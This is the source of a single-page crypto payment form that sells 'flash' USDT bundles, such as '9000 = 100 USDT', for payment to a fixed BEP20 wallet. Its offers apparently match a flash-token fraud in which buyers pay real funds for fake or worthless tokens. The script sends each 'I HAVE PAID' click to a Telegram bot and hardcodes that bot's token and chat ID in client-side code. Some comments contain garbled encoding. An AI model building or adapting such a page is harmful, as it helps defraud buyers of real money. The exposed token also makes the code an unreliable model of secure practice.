<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>USDT Payment - Neon Ledger (iOS Glass)</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100..900&display=swap" rel="stylesheet">

  <style>
    /* üí° iOS Dark Mode & Neon Colors (Focusing on Green/USDT) */
    :root {
      --primary-bg: #000000; 
      --secondary-bg: #1C1C1E; 
      --tertiary-bg: #2C2C2E; 
      --text-color: #FFFFFF;
      --secondary-text-color: #98989a;
      --border-color: #38383a;
      --back-button-color: #FFFFFF; 
      
      /* USDT Neon Theme Variables */
      --neon-green: #00FF99; 
      --primary-bg-dark: #000000;
      --input-bg-dark: #181830; 
      --shadow-color-usdt: rgba(0, 255, 153, 0.7);
      --error-color: #FF3B30; 
    }

    * {
      box-sizing: border-box;
      margin: 0; 
      padding: 0; 
      font-family: 'Inter', sans-serif, 'Arial', sans-serif;
      transition: all 0.3s ease-in-out; 
    }

    /* Base Body Styling */
    body {
      color: var(--text-color);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center; 
      padding: 20px;
      overflow-x: hidden;
      padding-top: 5rem; /* Space for the lowered back button */
      position: relative; 
    }

    /* --- Video Background Styling (ADDED) --- */
    #video-background {
      position: fixed;
      right: 0;
      bottom: 0;
      min-width: 100%;
      min-height: 100%;
      width: auto;
      height: auto;
      z-index: -100; 
      object-fit: cover; 
      filter: none; 
    }
    
    /* Container (Frosted Glass / ÿ¥ŸÅÿßŸÅÿ©) - 350px width */
    .container {
      background: rgba(28, 28, 30, 0.4); 
      backdrop-filter: blur(15px); 
      border-radius: 12px;
      padding: 25px 30px; 
      max-width: 350px; /* Applied size */
      width: 90vw; 
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5), 0 0 15px var(--shadow-color-usdt); 
      border: 1px solid rgba(255, 255, 255, 0.1); 
      display: flex;
      flex-direction: column;
      gap: 15px; 
      position: relative; 
      z-index: 10; 
    }

    /* --- Back Button Style (Fixed to 3rem) --- */
    .back-button-container {
      width: 100%;
      position: fixed; 
      top: 3rem; /* Applied size */
      left: 50%;
      transform: translateX(-50%);
      padding: 10px 20px;
      padding-top: 1rem; 
      display: flex;
      justify-content: flex-start;
      align-items: center;
      z-index: 20;
      background-color: transparent; 
    }

    .back-button {
      background: transparent;
      border: none;
      cursor: pointer;
      color: var(--back-button-color); 
      font-size: 1.1rem;
      font-weight: 600;
      display: flex;
      align-items: center;
      transition: opacity 0.2s;
      text-decoration: none;
      text-shadow: 0 0 5px rgba(0, 0, 0, 0.8);
      padding-left: 10px; 
    }
    .back-button:hover {
        opacity: 0.7;
    }
    .back-button svg {
        width: 20px;
        height: 20px;
        margin-right: 5px;
        stroke-width: 2.5;
    }


    /* Title Styling */
    h2 {
      text-align: center;
      margin-bottom: 5px;
      font-size: 1.8rem; 
      font-weight: 800;
      letter-spacing: 0.05em;
      color: var(--neon-green); 
      text-shadow: 0 0 8px var(--shadow-color-usdt); 
      padding-bottom: 10px;
    }

    /* Field Titles/Labels */
    .field-title {
        text-align: left;
        color: var(--secondary-text-color);
        font-size: 0.9rem; 
        font-weight: 500;
        margin-bottom: 5px;
        display: block; 
    }

    /* Select/Dropdown Style */
    select {
      width: 100%;
      padding: 14px; 
      font-size: 1rem;
      border-radius: 10px; 
      border: 1px solid rgba(0, 255, 153, 0.5); 
      background-color: var(--input-bg-dark);
      color: var(--text-color);
      margin-bottom: 20px;
      outline: none;
      transition: box-shadow 0.3s;
      -webkit-appearance: none; 
      appearance: none;
      box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.6);
    }
    select:focus {
        box-shadow: 0 0 10px var(--shadow-color-usdt), inset 0 2px 5px rgba(0, 0, 0, 0.6);
    }
    select {
      background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%2020%2020%22%20fill%3D%22white%22%3E%3Cpath%20d%3D%22M5.293%207.293a1%201%200%20011.414%200L10%2010.586l3.293-3.293a1%201%200%20111.414%201.414l-4%204a1%201%200%2001-1.414%200l-4-4a1%201%200%20010-1.414z%22%20clip-rule%3D%22evenodd%22%20fill-rule%3D%22evenodd%22%2F%3E%3C%2Fsvg%3E");
      background-repeat: no-repeat;
      background-position: right 15px center;
      background-size: 15px;
    }

    /* Payment Note Style */
    .amount-display {
      font-size: 1.15rem;
      color: var(--neon-green);
      font-weight: 700;
      margin-bottom: 25px;
      text-shadow: 0 0 5px var(--shadow-color-usdt);
      padding: 5px 0;
    }

    /* --- Wallet Address and Copy Button Layout --- */
    .address-group {
        display: flex;
        align-items: stretch;
        margin-bottom: 30px;
        gap: 10px; 
    }
    
    /* Copy Box Style */
    .copy-box {
      flex-grow: 1; 
      background-color: var(--input-bg-dark);
      color: white;
      padding: 14px; 
      border-radius: 10px; 
      overflow-wrap: break-word;
      word-break: break-all;
      font-size: 0.85rem;
      border: 1px solid rgba(255, 255, 255, 0.05);
      box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.6);
      text-align: left;
      font-weight: 500;
    }

    /* Dedicated Copy Button */
    .copy-btn {
        padding: 0 15px; 
        background: var(--neon-green); 
        color: var(--primary-bg-dark); 
        border: none;
        border-radius: 10px;
        font-weight: 700;
        cursor: pointer;
        font-size: 0.9rem;
        transition: all 0.3s ease;
        box-shadow: 0 0 10px var(--shadow-color-usdt);
        flex-shrink: 0; 
        display: flex;
        align-items: center; 
        text-align: center;
    }
    .copy-btn:hover {
        background: #fff;
        color: var(--primary-bg-dark);
        box-shadow: 0 0 15px var(--shadow-color-usdt);
        transform: translateY(-1px);
    }

    /* Pay Button Style */
    button#paid {
      padding: 16px 20px;
      margin-top: 10px;
      width: 100%;
      font-size: 1.15rem; 
      border-radius: 10px;
      border: none;
      background-color: var(--neon-green); 
      color: var(--primary-bg-dark); 
      font-weight: 800;
      cursor: pointer;
      box-shadow: 0 0 20px var(--shadow-color-usdt);
    }

    button#paid:hover:not(:disabled) {
      background-color: #fff;
      box-shadow: 0 0 30px var(--shadow-color-usdt);
      transform: translateY(-2px);
    }
    
    button#paid:disabled {
        background-color: #333; 
        color: #777;
        box-shadow: none;
        cursor: not-allowed;
    }
    
    /* Status Message Box */
    #status-message {
        position: absolute;
        top: 0;
        left: 50%;
        transform: translate(-50%, -120%); 
        background: var(--input-bg-dark);
        color: var(--neon-green);
        padding: 8px 15px;
        border-radius: 10px;
        font-size: 0.9rem;
        font-weight: 600;
        border: 1px solid var(--neon-green);
        box-shadow: 0 0 10px var(--shadow-color-usdt);
        opacity: 0;
        transition: opacity 0.5s, transform 0.5s;
        min-width: 250px;
        text-align: center;
        z-index: 100;
    }
    #status-message.visible {
        opacity: 1;
        transform: translate(-50%, -100%);
    }

    /* Spinner for loading state */
    .spinner {
      border: 3px solid rgba(255, 255, 255, 0.3);
      border-top: 3px solid var(--primary-bg-dark); 
      border-radius: 50%;
      width: 16px;
      height: 16px;
      animation: spin 1s linear infinite;
      display: inline-block;
      margin-right: 10px;
      vertical-align: middle;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body class="font-sans">
    
    <video autoplay muted loop playsinline id="video-background">
        <source src="background2.mp4" type="video/mp4">
        Your browser does not support the video tag.
    </video>

    <audio id="bipSound" src="bip.mp3" preload="auto"></audio>

    <div id="status-message"></div>
    
    <div class="back-button-container">
        <a href="payment.html" class="back-button" aria-label="Go back to Payment Options">
            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7"></path></svg>
            Back
        </a>
    </div>

  <div class="container">
    
    <div class="title flex items-center justify-center gap-3">
        <img src="usdt.png" alt="USDT" class="w-[30px] h-[30px] rounded-full shadow-lg" onerror="this.onerror=null; this.src='https://placehold.co/30x30/00FF99/000?text=U';" style="box-shadow: 0 0 10px var(--neon-green);" />
        <h2>USDT PAY (BEP20)</h2>
    </div>

    <div class="field-title">SELECT FLASH AMOUNT (USDT)</div>
    <select id="amount" onchange="updateAmount(); playBeep()">
      <option value="10">500 = 10 USDT</option>
      <option value="20">1500 = 20 USDT</option>
      <option value="40">3500 = 40 USDT</option>
      <option value="100">9000 = 100 USDT</option>
    </select>

    <div class="amount-display" id="display">YOU WILL PAY: 10 USDT</div>

    <div class="field-title">DESTINATION WALLET ADDRESS (BEP20)</div>
    <div class="address-group">
        <div class="copy-box" id="wallet-address">0x9e41239ef54a5bfdec23f8fb060f40e52d58b86a</div>
        <button class="copy-btn" onclick="copyWallet(); playBeep()">COPY</button>
    </div>
    
    <button id="paid" onclick="submitPayment()">I HAVE PAID</button>
  </div>

<script>
    const messageEl = document.getElementById('status-message');
    const paidBtn = document.getElementById('paid');
    const bipSound = document.getElementById('bipSound');
    
    const WALLET_ADDRESS = "0x9e41239ef54a5bfdec23f8fb060f40e52d58b86a";

    function playBeep() {
        if (bipSound) {
            bipSound.currentTime = 0; 
            bipSound.play().catch(e => console.log('Bip sound play failed:', e));
        }
    }

    function displayMessage(text, isError = false) {
      messageEl.textContent = text;
      messageEl.classList.add('visible');
      
      const color = isError ? 'var(--error-color)' : 'var(--neon-green)';
      const shadow = isError 
          ? '0 0 10px rgba(255, 59, 48, 0.7)' 
          : '0 0 10px var(--shadow-color-usdt)'; 
          
      messageEl.style.color = color;
      messageEl.style.borderColor = color;
      messageEl.style.boxShadow = shadow;
          
      setTimeout(() => {
        messageEl.classList.remove('visible');
      }, 3000);
    }

    function updateAmount() {
      const amountSelect = document.getElementById('amount');
      const val = amountSelect.value;
      
      document.getElementById('display').innerText = `YOU WILL PAY: ${val} USDT`;
    }
    
    document.addEventListener('DOMContentLoaded', updateAmount);

    function copyWallet() {
      try {
        const tempInput = document.createElement('textarea');
        tempInput.value = WALLET_ADDRESS;
        document.body.appendChild(tempInput);
        tempInput.select();
        document.execCommand('copy');
        document.body.removeChild(tempInput);
        
        displayMessage("Wallet address copied successfully!");
      } catch (err) {
        console.error('Failed to copy address: ', err);
        displayMessage("Failed to copy address. Please copy manually.", true);
      }
    }

    function submitPayment() {
      playBeep();
      paidBtn.disabled = true;
      paidBtn.innerHTML = '<span class="spinner"></span> SUBMITTING...';
      
      const amount = document.getElementById("amount").value;
      
      const chat_id = '8066634898';
      const bot_token = '8385960576:AAFZ_L4tpFbAHlMCebdXyX20XG5ZGgWBRRg';
      const message = `üöÄ New USDT Payment (BEP20)\n---\nüí∞ Amount: ${amount} USDT\nüì• Wallet: ${WALLET_ADDRESS}`;
      
      const maxRetries = 3;
      let retryCount = 0;

      const performFetch = () => {
          fetch(`https://api.telegram.org/bot${bot_token}/sendMessage`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ chat_id: chat_id, text: message })
          }).then(response => {
              if (!response.ok) { throw new Error('Telegram API error'); }
              paidBtn.innerHTML = 'PAYMENT SENT (REDIRECTING...)';
              paidBtn.style.backgroundColor = 'var(--neon-green)';
              paidBtn.style.color = 'var(--primary-bg-dark)';
              displayMessage("Payment submitted successfully!", false);
              setTimeout(() => { window.location.href = "confirmation.html"; }, 1500); 
          }).catch(error => {
              console.error("Submission Error:", error);
              if (retryCount < maxRetries) {
                  retryCount++;
                  const delay = Math.pow(2, retryCount) * 1000; 
                  paidBtn.innerHTML = `<span class="spinner"></span> RETRYING (${retryCount}/${maxRetries})...`;
                  setTimeout(performFetch, delay);
              } else {
                  paidBtn.innerHTML = 'ERROR! TRY AGAIN';
                  paidBtn.disabled = false;
                  paidBtn.style.backgroundColor = 'var(--error-color)'; 
                  paidBtn.style.boxShadow = '0 0 15px rgba(255, 59, 48, 0.7)';
                  paidBtn.style.color = 'var(--text-color)'; 
                  displayMessage("Submission failed after multiple tries. Check connection.", true);
              }
          });
      };

      performFetch();
    }
</script>

</body>
</html>
